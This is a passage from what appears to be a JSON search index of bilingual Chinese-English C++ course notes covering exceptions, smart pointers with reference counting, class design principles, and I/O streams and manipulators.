</ul> <pre><code>template &lt;class T&gt;\nclass Derived : public Base&lt;T&gt;\n{\n    ...\n};\n</code></pre> <ul> <li>Non-template classes can inherit from template classes</li> </ul> <pre><code>class Derived : public Base&lt;int&gt;\n{\n    ...\n};\n</code></pre>"}, {"location": "Course/OOP/Lec09/", "title": "Exceptions | \u5f02\u5e38", "text": "<p> \u7ea6 357 \u4e2a\u5b57  162 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> Vector codeproblem <pre><code>template &lt;class T&gt;\nclass Vector\n{\nprivate:\n    T *elem;\n    int sz;\npublic:\n    Vector(int s = 0) : sz(s) ... \n    ~Vector() { delete[] elem; }\n    T &amp;operator[](int i);\n    int size() const { return sz; }\n};\n</code></pre> <ul> <li><code>T &amp;operator[](int i);</code> \u662f\u53ef\u80fd\u53d1\u751f\u8d8a\u754c\u7684\uff0c\u5982\u4f55\u5904\u7406\uff1a</li> <li> <p>Choice: </p> <ol> <li>Return random memory object \u2014 <code>return elem[i];</code></li> <li> <p>Return a special error value</p> <pre><code>if(i &lt; 0 || i &gt;= size())\n{\n    // WRONG - T \u4e0d\u4e00\u5b9a\u6709\u8fd9\u79cd\u6784\u9020\u51fd\u6570\uff0c\u4e14\u539f\u672c\u5c31\u53ef\u80fd\u6709\u8fd9\u6837\u6b63\u5e38\u7684\u5185\u5bb9\n    T *error_marker = new T(\"some magic value\");\n    return *error_marker;\n}\nreturn elem[i];\n</code></pre> <ul> <li>But this throws the baby out with the bath!</li> <li><code>x = v[2] + v[4]; //Not safe code</code></li> </ul> </li> <li> <p>Just die!</p> <pre><code>if(i &lt; 0 || i &gt;= size())\n{\n    exit(22);\n}\nreturn elem[i];\n</code></pre> </li> <li> <p>Die gracefully (with autopsy)</p> <pre><code>assert(i &gt;= 0 &amp;&amp; i &lt; size());\nreturn elem[i];\n</code></pre> <ul> <li><code>assert</code> \u505a\u63a5\u53e3\u68c0\u67e5\uff0c\u5728\u8c03\u7528\u51fd\u6570\u65f6\u4f1a\u68c0\u67e5\u4f20\u5165\u53c2\u6570\u662f\u5426\u5408\u6cd5\uff0c\u82e5\u4e0d\u5408\u6cd5\u5219\u76f4\u63a5\u9000\u51fa\u7a0b\u5e8f</li> </ul> </li> </ol> </li> </ul> <ul> <li>When to use exceptions?<ul> <li>Many times, you don\u2019t know what should be done</li> <li>Solution: turf the problem to the caller | \u5c06\u95ee\u9898\u5411\u4e0a\u62a5<ul> <li>Make caller responsible for handling the problem</li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec09/#throw", "title": "<code>throw</code> | \u629b\u51fa\u5f02\u5e38", "text": "<ul> <li> <p>How to raise an exception \u2014 <code>throw</code></p> <pre><code>template &lt;class T&gt;\nT &amp;Vector&lt;T&gt;::operator[](int i)\n{\n    if(i &lt; 0 || i &gt;= size())\n    {\n        // throw is a keyword\n        // exception is raised at this point\n        throw &lt;&lt; something &gt;&gt;\n    }\n    return elem[i];\n}\n</code></pre> </li> <li> <p>What do you throw?</p> <ul> <li>What do you have? \u2190 Data</li> <li>Define a class to represent the error</li> </ul> <pre><code>class VectorIndexError\n{\npublic:\n    VectorIndexError(int i) : m_badValue(i) {}\n    ~VectorIndexError() {}\n    void diagnostic() \n    {\n        cerr &lt;&lt; \"index \" &lt;&lt; m_badValue &lt;&lt; \" is out of range\" &lt;&lt; endl;\n    }\nprivate:\n    int m_badValue;\n};\n</code></pre> </li> <li> <p>How to raise it?</p> <pre><code>template &lt;class T&gt;\nT &amp;Vector&lt;T&gt;::operator[](int i)\n{\n    if(i &lt; 0 || i &gt;= size())\n    {\n        // VectorIndexError e(i);\n        // throw e;\n        throw VectorIndexError(i);\n    }\n    return elem[i];\n}\n</code></pre> </li> <li> <p>What about your caller</p> <ol> <li> <p>Case 1) Don\u2019t care \u2014 Code never even suspects a problem</p> <pre><code>int func()\n{\n    Vector&lt;int&gt; v(12);\n    v[3] = 5;\n    int i = v[42];  // Out of range\n    // Control never gets here\n    return i;\n}\n</code></pre> </li> <li> <p>Case 2) Care deeply</p> <pre><code>void outer()\n{\n    try\n    {\n        func(); // func() throws an exception\n        func2();// won't be called\n    }\n    catch(VectorIndexError &amp;e)\n    {\n        e.diagnostic();\n        //This exception does not propagate\n    }\n    cout &lt;&lt; \"Control is here after exception\";\n}\n</code></pre> </li> <li> <p>Case 3) Mildly interested</p> <pre><code>void outer()\n{\n    string err(\"exception caught\");\n    try\n    {\n        func(); // func() throws an exception\n    }\n    catch(VectorIndexError)\n    {\n        cout &lt;&lt; err;\n        throw;  // propagate the exception\n    }\n}\n</code></pre> </li> <li> <p>Case 4) Doesn\u2019t care about the particulars ( <code>...</code> means \u201ccatch All exceptions\u201d )</p> <pre><code>void outer()\n{\n    try\n    {\n        func(); // func() throws an exception\n    }\n    catch(...)\n    {\n        // ... catches ALL exceptions!!\n        cout &lt;&lt; \"exception caught\";\n    }\n}\n</code></pre> </li> </ol> </li> </ul> Review <ul> <li>Throw statement raises the exception<ul> <li>Control propagates back to first handler for that exception</li> <li>Propagation follows the call chain</li> <li>Objects on stack are properly destroyed</li> </ul> </li> <li><code>throw exp</code>;<ul> <li>throws value for matching</li> </ul> </li> <li><code>throw</code>;<ul> <li>reraises the exception being handled</li> <li>valid only within a handler</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec09/#exception-handlers", "title": "Exception Handlers", "text": "<ul> <li> <p>Try block</p> <pre><code>try\n{\n    // code that might throw an exception\n}\ncatch ...\n{\n    // code that handles the exception\n}\ncatch ...\n{\n    // code that handles the exception\n}\n</code></pre> <ul> <li>Establishes any number of handlers</li> <li>Not needed if you don\u2019t use any handlers</li> <li>Shows where you expect to handle exceptions</li> <li>Costs cycles</li> </ul> </li> <li> <p>Exception handlers</p> <ul> <li>Select exception by type</li> <li>Can re-raise exception</li> <li>Two forms<ul> <li><code>catch (Type)</code></li> <li><code>catch (...)</code></li> </ul> </li> <li>Take a single argument (like a formal parameter)</li> </ul> </li> <li> <p>Selecting a handler</p> <ul> <li>Can have any number of handlers</li> <li>Handlers are checked in order of appearance 1. Check for exact match 2. Apply base class conversions (Reference and pointer types, only) 3. Ellipses(\u2026) matches any exception</li> </ul> </li> <li> <p>Inheritance can be used to structure exceptions</p> using inheritance <ul> <li>Hierachy of exception types</li> </ul> code - handlersusing handlers <pre><code>class MathErr\n{\n    ...\n    virtual void diagnostic();\n};\nclass OverflowErr : public MathErr { ... }\nclass UnderflowErr : public MathErr { ... }\nclass ZeroDivideErr : public MathErr { ... }\n</code></pre> <pre><code>try\n{\n    // code to exercise math options\n    throw UnderflowErr();\n}\ncatch(ZeroDivideErr &amp;e)\n{\n    // handle divide by zero\n}\ncatch(MathErr &amp;e)\n{\n    // handle other math errors\n}\ncatch(...)\n{\n    // handle all other exceptions\n}\n</code></pre> <ul> <li>\u5f02\u5e38\u5e94\u7531\u7a84\u5230\u5bbd\u8fdb\u884c\u5904\u7406\uff0c\u5373\u5148\u5904\u7406\u5b50\u7c7b\u5f02\u5e38\uff0c\u518d\u5904\u7406\u7236\u7c7b\u5f02\u5e38\uff0c\u6700\u540e\u5904\u7406\u6240\u6709\u5f02\u5e38</li> </ul> </li> <li> <p>Exception and new</p> <ul> <li>new does NOT return 0 on failure</li> <li>new raises a bad_alloc exception on failure</li> </ul> <pre><code>void func()\n{\n    try\n    {\n        while(1)\n        {\n            char *p = new char[10000000];\n        }\n    }\n    catch(bad_alloc &amp;e)\n    {\n        cerr &lt;&lt; \"out of memory\" &lt;&lt; endl;\n    }\n}\n</code></pre> </li> </ul> \u8865\u5145 <p></p> <ul> <li> <p>Exception specifications</p> <ul> <li>Declare which exceptions a function might throw</li> <li>Part of function prototypes</li> </ul> <pre><code>void func() throw (OverflowErr)\n{\n    ...\n}\n</code></pre> <ul> <li>Not checked at compile time</li> <li>At run time, if an exception not in the list propagates out, the <code>unexpected</code> exception is raised</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec09/#failure-in-ctors-dtors", "title": "Failure in Ctors &amp; Dtors", "text": ""}, {"location": "Course/OOP/Lec09/#failure-in-ctors", "title": "Failure in Ctors", "text": "<ul> <li>No return value is possible</li> <li>Use an \u201cuninitialized\u201d flag</li> <li>Defer work to an Init() function</li> <li> <p>Better to throw an exception</p> </li> <li> <p>If a constructor can\u2019t complete, throw an exception</p> <ul> <li>Dtors for objects whose ctor didn\u2019t complete won\u2019t be called</li> <li>Clean up allocated resources before throwing</li> </ul> </li> </ul> Suggest - Two stages construction <ul> <li>Do normal work in ctor<ul> <li>Initialize all member objects</li> <li>Initialize all primitive members</li> <li>Initialize all pointers to 0</li> <li>NEVER request any resources<ul> <li>File / Network connection / Memory</li> </ul> </li> </ul> </li> <li>Do additional work in Init() function<ul> <li>Request resources</li> <li>Do any other work that might fail</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec09/#failure-in-dtors", "title": "Failure in Dtors", "text": "<p>Destructors are called when:</p> <ul> <li>Normal call: object exists from scope</li> <li> <p>During exceptions: stack unwinding invokes dtors on objects as scope is existed</p> </li> <li> <p>Throwing an exception in a dtor that is itself being called as the result of an exception will invoke <code>std::terminate()</code></p> <ul> <li>Allowing exceptions to escape from dtors should be avoided</li> </ul> </li> </ul> catch <ul> <li><code>catch</code> exceptions by reference or pointer</li> <li><code>catch(BUG *e)</code> \u2014 we need <code>delete e</code> in the handler</li> <li><code>catch(BUG &amp;e)</code> \u2014 we need care when to destruct <code>e</code></li> </ul>"}, {"location": "Course/OOP/Lec10/", "title": "Smart Pointers | \u667a\u80fd\u6307\u9488", "text": "<p> \u7ea6 363 \u4e2a\u5b57  90 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <ul> <li><code>Templates</code>, <code>Inheritance</code>, <code>Reference Counting</code> \u5408\u8d77\u6765\u5b9e\u73b0 <code>Smart Pointers</code></li> <li><code>Reference Counting</code> \u662f\u6709\u591a\u5c11\u4e2a\u6307\u9488\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u5982\u679c\u6ca1\u6709\u6307\u9488\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u5c31 <code>delete</code> \u8fd9\u4e2a\u5bf9\u8c61</li> </ul> Smart Pointer \u7684\u6765\u6e90 <p>C++ Strategies and Tactics, Robert B. Murray, 1993</p> <p>Goals</p> <ul> <li>Introduce the code for maintaining reference counts<ul> <li>A reference count is a count of the number of times an object is shared</li> <li>Pointer manipulations have to maintain the count</li> </ul> </li> <li>Class UCObject(Use-counted object) holds the count</li> <li>UCPointer is a smart pointer to a UCObject<ul> <li>A smart pointer is an object defined by a class</li> <li>Implemented using a template</li> <li>Overloads operator-&gt;  and  unary operator*</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec10/#reference-counting", "title": "Reference counting", "text": "<ul> <li>Each shared object has a counter</li> <li>Initial value is 0</li> <li> <p>Whenever a pointer is assigned <code>p = q</code></p> <ul> <li>Have to do the following</li> </ul> <pre><code>p-&gt;decrement(); // p's count will decrease \np = q;\nq-&gt;increment(); // q's count will increase\n</code></pre> </li> </ul> <p>StringRep</p> <pre><code>#include \"UCObject.hpp\"\n#include &lt;cstring&gt;\nclass StringRep:public UCObject\n{\npublic:\n    StringRep(const char *s)\n    {\n        if(s)\n        {\n            int len = strlen(s) + 1;\n            m_pChars = new char(len);\n            strcpy(m_pChars, s);\n        }\n        else\n        {\n            m_pChars = new char[1];\n            *m_pChars = '\\0';\n        }\n    }\n    ~StringRep()\n    {\n        delete[] m_pChars;  // \u5f15\u7528\u8ba1\u6570\u662f\u7236\u7c7b\u8981\u505a\u7684\u4e8b\u60c5\n    }\n    StringRep(const StringRep &amp;sr)\n    {\n        int len sr.length();\n        m_pChars = new char[len + 1];\n        strcpy(m_pChars, sr.m_pChars);\n    }\n    int length() const\n    {\n        return strlen(m_pChars);\n    }\n    int equal(const StringRep &amp;sp) const\n    {\n        return (strcmp(m_pChars, sp.m_pChars) == 0);\n    }\nprivate:\n    char *m_pChars;\n    // reference semantics -- no assignment op!\n    void operator=(const StringRep &amp;){} // \u4e0d\u5141\u8bb8\u76f4\u63a5\u8d4b\u503c\uff0c\u56e0\u4e5f\u6ca1\u6709\u8d4b\u503c\u7684\u5fc5\u8981\n};\n</code></pre> <p>String</p> <pre><code>#include \"UCPointer.hpp\"\n#include \"StringRep.hpp\"\nclass String\n{\npublic:\n    String(const char *s) : m_rep(0)\n    {\n        m_rep = new StringRep(s);\n    }\n    ~String(){}\n    String(const String &amp;s) : m_rep(s.m_rep) {}\n    String &amp;operator=(const String &amp;s)\n    {\n        m_rep = s.m_rep;    // let smart pointer do work!\n        return *this;\n    }\n    int operator==(const String &amp;s) const\n    {\n        // overload -&gt; forwards to StringRep\n        return m_rep-&gt;equal(*(s.m_rep));    // smart ptr *\n    }\n    String operator+(const String &amp;s) const;\n    int length() const\n    {\n        return m_rep-&gt;length();\n    }\n    operator const char *() const;\nprivate:\n    UCPointer&lt;StringRep&gt; m_rep; // m_rep \u8868\u9762\u662f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8bed\u4e49\u4e0a\u662f\u4e00\u4e2a\u6307\u9488\n};\n</code></pre> <ul> <li><code>m_rep = new StringRep(s);</code> \u4e2d <code>m_rep</code> \u7684\u7c7b\u578b\u662f <code>UCPointer</code>, <code>new</code> \u7684\u7c7b\u578b\u662f <code>StringRep *</code> \u4e0d\u80fd\u76f4\u63a5\u8d4b\u503c\uff0c\u4f1a\u8c03\u7528 <code>UCPointer</code> \u4e2d\u7684\u6784\u9020\u51fd\u6570\u628a <code>StringRep *</code> \u8f6c\u6362\u6210 <code>UCPointer</code></li> </ul> <pre><code>UCPointer(T *r = 0) : m_pObj(r)\n{\n    increment();\n}\n</code></pre> \u4e0a\u8ff0\u8fc7\u7a0b\u4e2d\u7684 reference count questionanswer <ul> <li>\u5728 <code>m_rep = new StringRep(s);</code> \u8d4b\u503c\u53d1\u751f\u524d <code>reference count</code> \u5c31\u5df2\u7ecf +1\uff0c\u6574\u4e2a\u8d4b\u503c\u5b8c\u6210\u540e <code>reference count = 2</code> </li> <li>\u8fd9\u548c\u6211\u4eec\u7684\u9884\u671f\u4e0d\u7b26\uff0c\u6211\u4eec\u5e0c\u671b <code>reference count = 1</code></li> </ul> <ul> <li>\u5176\u5b9e\u5728 <code>m_rep = new StringRep(s);</code> \u56e0\u4e3a\u7c7b\u578b\u7684\u4e0d\u540c\u9700\u8981\u4f7f\u7528\u4e34\u65f6\u5bf9\u8c61\u6784\u9020 <code>UCPointer</code> \u518d\u8d4b\u503c\u7ed9 <code>m_rep</code></li> <li>\u6240\u4ee5\u5728\u8d4b\u503c\u5b8c\u6210\u540e\u4f1a\u628a\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u6790\u6784\uff0c<code>reference count -= 1 -&gt; reference count = 1</code> </li> </ul> <p>[Critique]: * <code>UCPointer</code> maintains reference counts * <code>UCObject</code> hides the details of the count String is very clean * <code>StringRep</code> deals only with string storage and manipulation * <code>UCObject</code> and <code>UCPointer</code> are reusable * Objects with cycles of <code>UCPointer</code> will never be deleted</p> Other smart pointers <ul> <li>Standard library holder for raw pointers on stack</li> <li>Releases resource when destroyed (latest)</li> </ul> <pre><code>template &lt;class X&gt; std::auto_ptr\n{\npublic:\n    explicit auto_ptr(X* = 0) throw();\n    auto_ptr(auto_ptr&amp;) throw();\n    auto_ptr&amp; operator=(auto_ptr&amp;) throw();\n    ~auto_ptr();\n    X&amp; operator*() const throw();\n    X* operator-&gt;() const throw();\n    \u00b7\u00b7\u00b7\n};\n</code></pre>"}, {"location": "Course/OOP/Lec11/", "title": "Class Design", "text": "<p> \u7ea6 580 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Designing classes</p> <p>How to write classes in a way taht they are easily understandable, maintainable, and reusable</p>"}, {"location": "Course/OOP/Lec11/#software-changes", "title": "Software changes", "text": "<ul> <li>Software is not like a novel that is written once and then remains unchanged</li> <li> <p>Software is extended, corrected, maintained, ported, adapted \u2026</p> </li> <li> <p>There are only two options for software</p> <ul> <li>It is dead</li> <li>It is changing</li> </ul> </li> <li>Software that cannot be maintained will be thrown away</li> </ul>"}, {"location": "Course/OOP/Lec11/#code-quality", "title": "Code quality", "text": "<ul> <li>Two important concepts for quality of code:<ul> <li>Coupling</li> <li>Cohesion</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec11/#coupling", "title": "Coupling | \u8026\u5408", "text": "<ul> <li>Coupling refers to links between separate units of a program</li> <li>If two classes depend closely on many details of each other, they are said to be tightly coupled</li> <li>We aim for loosely coupled </li> </ul> <p>Loose coupling</p> <p>Loose coupling makes it possible to:   * understand one class without reading others   * change one class without affecting others   * Thus: improve maintainability</p> <p>tech. to achieve loose coupling</p> <ol> <li>call-back \u2014 \u53d1\u6d88\u606f\u5b9a\u4e49\u4e00\u4e2a\u63a5\u53e3\uff0c\u53e6\u4e00\u65b9\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u6ce8\u518c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u53d1\u6d88\u606f\u65f6\u8c03\u7528\u5176\u56de\u8c03\u51fd\u6570\u4ece\u800c\u901a\u77e5\u81ea\u5df1\u8fd9\u4ef6\u4e8b\u60c5\u53d1\u751f\u4e86</li> <li>message mechanism \u2014 \u5b9e\u73b0\u4e2d\u592e\u6d88\u606f\u673a\u5236\uff0c\u628a\u4e8b\u60c5\u53d1\u7ed9\u4e2d\u592e\uff0c\u4e2d\u592e\u518d\u53d1\u5e03\u7ed9\u6ce8\u518c\u8005</li> </ol>"}, {"location": "Course/OOP/Lec11/#cohesion", "title": "Cohesion | \u5185\u805a", "text": "<ul> <li>Cohesion refers to the number and diversity of tasks that diversity of tasks that a single unit is responsible for</li> <li>If each unit is responsible for one single logical task, we say it has high cohesion</li> <li>Cohesion applies to classes and methods</li> <li>We aim for high cohesion</li> </ul> <p>\u8ba9\u4e00\u4e2a\u5355\u5143\u53ea\u590d\u6742\u4e00\u4ef6\u4e8b\u60c5\uff0c\u5c0f\u5230\u53d8\u91cf\uff0c\u5927\u5230\u6a21\u5757\u00b7\u00b7\u00b7</p> <p>High cohesion</p> <p>High cohesion makes it easier to:     * understand a class or method     * use descriptive names     * reuse classes or methods</p> Code duplication | \u4ee3\u7801\u91cd\u590d <ul> <li>is an indicator of bad design</li> <li>makes maintenance harder</li> <li>can lead to introduction of errors during maintenance</li> </ul>"}, {"location": "Course/OOP/Lec11/#responsibility-driven-design", "title": "Responsibility-driven design | \u8d23\u4efb\u9a71\u52a8\u8bbe\u8ba1", "text": "<ul> <li>Question: where should we add a new method(which class)?</li> <li>Each class should be responsible for manipulating its own data</li> <li>The class that owns the data should be responsible for processing it</li> <li>RDD leads to low coupling and high cohesion</li> </ul>"}, {"location": "Course/OOP/Lec11/#localizing-changes", "title": "Localizing changes | \u5c40\u90e8\u5316\u53d8\u5316", "text": "<ul> <li>One aim of reducing coupling and responsibility-driven design is to localize changes</li> <li>When a change is needed, as few classes as possible should be affected</li> </ul> <p>\u53ef\u6269\u5c55\u6027\uff08extensibility\uff09 \u2014 \u4ee3\u7801\u4e0d\u9700\u8981\u4fee\u6539\uff08or \u5f88\u5c11\u7684\u4fee\u6539\uff09\u5c31\u53ef\u4ee5\u6ee1\u8db3\u672a\u6765\u7684\u9700\u6c42</p>"}, {"location": "Course/OOP/Lec11/#refactoring", "title": "Refactoring | \u91cd\u6784", "text": "<p>Code refactoring \u662f\u4ec0\u4e48</p> <p>\u5728\u4e0d\u6539\u53d8\u8f6f\u4ef6\u7684\u5916\u90e8\u884c\u4e3a\u7684\u6761\u4ef6\u4e0b\uff0c\u901a\u8fc7\u4fee\u6539\u4ee3\u7801\u6539\u53d8\u8f6f\u4ef6\u5185\u90e8\u7ed3\u6784\uff0c\u5c06\u6548\u7387\u4f4e\u4e0b\u548c\u8fc7\u4e8e\u590d\u6742\u7684\u4ee3\u7801\u8f6c\u6362\u4e3a\u66f4\u9ad8\u6548\u3001\u66f4\u7b80\u5355\u7684\u4ee3\u7801</p> <ul> <li>Advantages:<ul> <li>\u63d0\u9ad8\u4ee3\u7801\u8d28\u91cf</li> <li>\u4f18\u5316\u8f6f\u4ef6\u4ea7\u54c1\u67b6\u6784\u4e0e\u6027\u80fd</li> <li>\u51cf\u5c11\u9879\u76ee\u7684\u6280\u672f\u503a\uff0c\u907f\u514d\u9879\u76ee\u91cd\u5199</li> </ul> </li> <li>Disadvantages:<ul> <li>\u589e\u52a0\u5de5\u4f5c\u8d1f\u62c5</li> <li>\u53ef\u80fd\u51fa\u73b0\u4e00\u4e9b\u4e1a\u52a1\u4e0a\u7684\u6f0f\u6d1e</li> <li>\u53ef\u80fd\u4ee3\u7801\u8fc7\u4e8e\u7cbe\u70bc\u5bfc\u81f4\u4ee3\u7801\u53ef\u8bfb\u6027\u53d8\u5dee</li> </ul> </li> </ul> <p>\u91cd\u6784 != \u91cd\u5199</p>"}, {"location": "Course/OOP/Lec12/", "title": "Streams &amp; \u7ee7\u627f\u6784\u9020\u51fd\u6570", "text": "<p> \u7ea6 3529 \u4e2a\u5b57  248 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p>"}, {"location": "Course/OOP/Lec12/#streams_1", "title": "Streams", "text": "<p>Why streams</p> <ul> <li>Original C I/O used printf, scanf</li> <li>Streams invented for C++<ul> <li>C I/O libraries still work</li> </ul> </li> <li>Advantages of streams<ul> <li>Better type safety</li> <li>Extensible</li> <li>More object-oriented</li> </ul> </li> <li>Disadvantages <ul> <li>More verbose</li> <li>Often slower</li> </ul> </li> </ul> <p><code>cin, cout</code> \u901f\u5ea6\u4f1a\u6bd4 <code>scanf, printf</code> \u6162</p>"}, {"location": "Course/OOP/Lec12/#stream-naming-conventions", "title": "Stream naming conventions", "text": "Input Output Header Generic istream ostream File ifstream ofstream C string(legacy) istrstream ostrstream C string istringstream ostringstream <ul> <li><code>cin</code> \u662f <code>istream</code></li> <li><code>istringstream</code> \u662f\u5728\u5b57\u7b26\u4e32\u4e0a\u5efa\u7acb\u4e00\u4e2a\u6d41</li> </ul>"}, {"location": "Course/OOP/Lec12/#stream-operations", "title": "Stream operations", "text": "<ul> <li>Extractors<ul> <li>Read a value from the stream</li> <li>Overload the <code>&gt;&gt;</code> operator</li> </ul> </li> <li>Inserters<ul> <li>Insert a value into a stream</li> <li>Overload the <code>&lt;&lt;</code> operator</li> </ul> </li> <li>Manipulators<ul> <li>Change the stream state</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec12/#kinds-of-streams", "title": "Kinds of streams", "text": "<ul> <li>Text streams<ul> <li>Deal in ASCII text</li> <li>Perform some character translation<ul> <li>e.g. : newline -&gt; actual OS file representation</li> </ul> </li> <li>Include<ul> <li>Files</li> <li>Character buffers</li> </ul> </li> </ul> </li> <li>Binary streams<ul> <li>Binary data</li> <li>No translation</li> </ul> </li> </ul> <p>\u6587\u672c\u6d41\u548c\u4e8c\u8fdb\u5236\u6d41\uff08\u5728 Linux \u4e2d\uff0c\u8bfb\u6587\u672c\u6587\u4ef6\u91cc\u9762\u81ea\u52a8\u628a 0D0A \u7ec4\u5408\u53d8\u6210\u4e00\u4e2a 0D\uff09</p> <p>Predefined streams</p> <ul> <li><code>cin</code> \u2014 standard input</li> <li><code>cout</code> \u2014 standard output</li> <li><code>cerr</code> \u2014 unbuffered error (debugging) output</li> <li><code>clog</code> \u2014 buffered error (debugging) output</li> </ul>"}, {"location": "Course/OOP/Lec12/#defining-a-stream-extractor", "title": "Defining a stream extractor", "text": "<ul> <li> <p>Has to be a 2-argument free function</p> <ul> <li>First argument is an <code>istream&amp;</code></li> <li>Second argument is a reference to the a value</li> </ul> <pre><code>istream&amp; operator&gt;&gt;(istream&amp; is, T&amp; t)\n{\n    // spefic code to read obj\n    return is;\n}\n</code></pre> </li> <li> <p>Return an <code>istream&amp;</code> for chaining</p> <pre><code>cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n((cin &gt;&gt; a) &gt;&gt; b) &gt;&gt; c;\n</code></pre> </li> </ul> Other input operators <ul> <li> <p><code>int get()</code></p> <ul> <li>Return the next character in the stream</li> <li>Returns EOF if no more characters</li> <li>Example: copy input to output</li> </ul> <pre><code>int ch;\nwhile ((ch = cin.get()) != EOF)\n    cout.put(ch);\n</code></pre> </li> <li> <p><code>istream&amp; get(char&amp; ch)</code></p> <ul> <li>Puts the next character into argument</li> <li>Similar to <code>int get()</code></li> </ul> </li> <li><code>get(char *buf, int limit, char delim = '\\n')</code><ul> <li>read up to <code>limit</code> characters, or to <code>delim</code></li> <li>Appends a null character to <code>buf</code></li> <li>Does not consume the delimiter</li> </ul> </li> <li><code>getline(char *buf, int limit, char delim = '\\n')</code><ul> <li>Similar to <code>get()</code>, but consumes the delimiter</li> </ul> </li> <li><code>ignore(int limit = 1, int delim = EOF)</code><ul> <li>Skip over limit characters or to delim</li> <li>Skip over delimiter if found</li> </ul> </li> <li><code>ing gcount()</code><ul> <li>return number of characters just read</li> </ul> </li> <li><code>void putback(char)</code><ul> <li>pushes a single character back into the stream</li> </ul> </li> <li><code>char peek()</code><ul> <li>examine next character without reading it</li> <li><code>switch(cin.peek()) { ... }</code></li> </ul> </li> </ul> Other output operators <ul> <li><code>put(char)</code><ul> <li>prints a single character</li> <li>Example: <ul> <li><code>cout.put('a')</code></li> <li><code>cerr.put('!')</code></li> </ul> </li> </ul> </li> <li><code>flush()</code><ul> <li>Force output of stream contents</li> <li>Example: <ul> <li><code>cout &lt;&lt; \"Hello\";</code></li> <li><code>cout.flush();</code></li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec12/#manipulators", "title": "Manipulators", "text": ""}, {"location": "Course/OOP/Lec12/#formatting-using-manipulators", "title": "Formatting using manipulators", "text": "<ul> <li>Manipulators modify the state of the stream<ul> <li><code>#include &lt;iomanip&gt;</code></li> <li>Effects hold(usually)</li> </ul> </li> <li> <p>Example:</p> <pre><code>int n;\ncout &lt;&lt; \"Enter a number in hex: \" &lt;&lt; flush;\ncin &gt;&gt; hex &gt;&gt; n;\n</code></pre> <ul> <li><code>hex</code> \u8868\u793a\u4ece\u6b64\u5904\u8d77\uff0c\u8bfb\u5165\u7684\u4e1c\u897f\u90fd\u662f\u5341\u516d\u8fdb\u5236\u7684\uff0c\u76f4\u5230\u5176\u4ed6\u7b26\u53f7\u6062\u590d\u6216\u7a0b\u5e8f\u7ed3\u675f</li> </ul> </li> </ul> List <ul> <li>Manipulators    </li> </ul> <p></p> <ul> <li>Stream flags control formatting</li> </ul> <p></p> <ul> <li>\u5168\u90e8\u8bbe\u7f6e\u76f4\u63a5\u7528 <code>or</code> \u5373\u53ef\uff0c\u4e0d\u540c <code>flag</code> \u5360\u636e\u4e0d\u540c bit \u4f4d</li> </ul> Example codeoutput <pre><code>#include &lt;iostream&gt;\n#include &lt;iomanip&gt;\nint main()\n{\n    cout &lt;&lt; setprecision(2) &lt;&lt; 1000.243 &lt;&lt; endl;\n    cout &lt;&lt; setw(20) &lt;&lt; \"OK!\" ;\n    return 0;\n}\n</code></pre> <pre><code>1e+03\n               OK!\n</code></pre> define your own manipulators <pre><code>//skelton for an output stream manipulator\nostream&amp; manipulator(ostream&amp; os)\n{\n    //do something to os\n    return os;\n}\nostream&amp; tab(ostream&amp; os)\n{\n    return os &lt;&lt; '\\t';\n}\ncout &lt;&lt; \"Hello\" &lt;&lt; tab &lt;&lt; \"World\" &lt;&lt; endl;\n</code></pre> Working with flags codeoutput <pre><code>#include &lt;iostream&gt;\n#include &lt;iomanip&gt;\nusing namespace std;\nint main()\n{\n    cout.setf(ios::showpos | ios::scientific);\n    cout &lt;&lt; 123 &lt;&lt; \" \" &lt;&lt; 456.78 &lt;&lt; endl;\n    cout &lt;&lt; resetiosflags(ios::showpos) &lt;&lt; 123;\n    return 0;\n}\n</code></pre> <pre><code>+123 +4.567800e+02\n123\n</code></pre>"}, {"location": "Course/OOP/Lec12/#stream-error-states", "title": "Stream error states", "text": "<p>\u8bfb\u5b8c\u4f1a\u56de\u5230 EOF</p>"}, {"location": "Course/OOP/Lec12/#working-with-streams", "title": "Working with streams", "text": "<ul> <li>Error state is set after each operation</li> <li>Conversion to <code>void *</code> returns 0 if problem</li> <li>Can clear an error state using <code>clear() // Reset error state to good()</code></li> <li>Checking status<ul> <li><code>good()</code> \u2014 Returns <code>true</code> if in valid state</li> <li><code>eof()</code> \u2014 Returns <code>true</code> if at EOF</li> <li><code>fail()</code> \u2014 Returns <code>true</code> if minor failure or bad</li> <li><code>bad()</code> \u2014 Returns <code>true</code> if in bad state</li> </ul> </li> </ul> Example <pre><code>int n;\ncout &lt;&lt; \"Enter a value for n, then [Enter]: \" &lt;&lt; flush;\nwhile(cin.good())\n{\n    cin &gt;&gt; n;\n    if(cin) // input was OK\n    {\n        cin.ignore(INT_MAX, '\\n');  // flush newline\n        break;\n    }\n    if(cin.fail()) // input was bad\n    {\n        cin.clear(); // clear error state\n        cin.ignore(INT_MAX, '\\n'); // skip garbage\n        cout &lt;&lt; \"Invalid input; please re-enter: \" &lt;&lt; flush;\n    }\n}\n</code></pre> <ul> <li><code>if(cin)</code> \u4e2d <code>cin</code> \u8fd4\u56de\u7684\u662f <code>good()</code> \u7684\u503c</li> <li><code>fail</code> \u4e00\u822c\u662f\u7c7b\u578b\u4e0d\u5339\u914d\uff0c<code>bad</code> 